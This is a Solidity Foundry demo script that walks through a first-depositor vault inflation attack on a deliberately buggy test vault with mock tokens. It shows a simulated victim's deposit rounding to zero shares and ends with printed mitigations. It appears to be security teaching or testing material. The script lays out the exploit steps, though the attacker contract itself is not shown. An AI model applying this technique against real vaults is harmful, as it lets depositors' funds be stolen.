// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Deploy.s.sol";
import "../src/attackers/Attacker_PoolImbalance.sol";

// Thêm khi fix theo cách 2
import "forge-std/Script.sol";


contract DemoPoolAttack is Script {
    DeployScript public deploy;
    Attacker_PoolImbalance public attacker;
    
    function run() external {
        // address deployer = msg.sender;
        
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();
        
        (
            address tokenA,
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            address vaultBuggy,
        ) = deploy.getAddresses();
        
        console("=== VAULT INFLATION ATTACK DEMO ===");
        console("");
        
        // 2. Deploy attacker
        attacker = new Attacker_PoolImbalance();
        
        // 3. Fund attacker
        MockERC20(tokenA).mint(address(attacker), 100000 * 1e18);
        console("Attacker funded with 100,000 tokenA");
        
        // 4. Show initial state
        console("");
        console("Initial Vault State:");
        console("  Total shares:", VaultBuggy(vaultBuggy).totalShares());
        console("  Total assets:", VaultBuggy(vaultBuggy).totalAssets() / 1e18);
        
        // 5. Execute attack - First depositor inflation
        console("");
        console("Executing Vault Inflation Attack...");
        console("  Step 1: Attacker becomes first depositor with 1 wei");
        console("  Step 2: Attacker donates 50,000 tokenA to vault");
        console("  Step 3: Share price is now inflated!");
        
        try attacker.attackVaultInflation(
            vaultBuggy,
            tokenA,
            50000 * 1e18
        ) {
            console("");
            console("Attack setup successful!");
            
            uint256 totalShares = VaultBuggy(vaultBuggy).totalShares();
            uint256 totalAssets = VaultBuggy(vaultBuggy).totalAssets();
            console("  Total shares:", totalShares);
            console("  Total assets:", totalAssets / 1e18);
            console("  Share value:", totalAssets / totalShares / 1e18);
            
            // 6. Simulate victim deposit
            console("");
            console("Victim attempts to deposit 25,000 tokenA...");
            
            address victim = address(0x1234);
            MockERC20 token = MockERC20(tokenA);

            token.mint(victim, 25000 * 1e18);

            // Victim really approves and deposits
            vm.startPrank(victim);
            token.approve(vaultBuggy, type(uint256).max);
            uint256 victimShares = VaultBuggy(vaultBuggy).deposit(25000 * 1e18);
            vm.stopPrank();
            
            console("  Victim received shares:", victimShares);
            console("  Expected: ~25,000 shares");
            console("  Actual: ", victimShares, "(ROUNDING LOSS!)");
            
            if (victimShares == 0) {
                console("");
                console("=== ATTACK SUCCESSFUL ===");
                console("Victim received 0 shares due to rounding!");
                console("Victim's 25,000 tokenA are stuck in vault!");
                console("Attacker can now withdraw with their 1 share!");
            }
            
        } catch Error(string memory reason) {
            console("Attack failed:", reason);
        }
        
        console("");
        console("=== EXPLANATION ===");
        console("This attack exploits vaults with improper first deposit handling.");
        console("Attacker can:");
        console("1. Be first depositor with tiny amount (1 wei)");
        console("2. Donate large amount to inflate share price");
        console("3. Subsequent deposits get rounded down to 0 shares");
        console("4. Attacker steals victim's deposited funds");
        console("");
        console("MITIGATION:");
        console("- Burn minimum shares on first deposit (like Uniswap V2)");
        console("- Use virtual shares/assets");
        console("- Check balance before/after transfer");
    }
    
    function console(string memory s) internal pure {}
    function console(string memory s, uint256 a) internal pure {}
    function console(string memory s, uint256 a, string memory t) internal pure {}
    function console(string memory s, string memory s2) internal pure {}
}

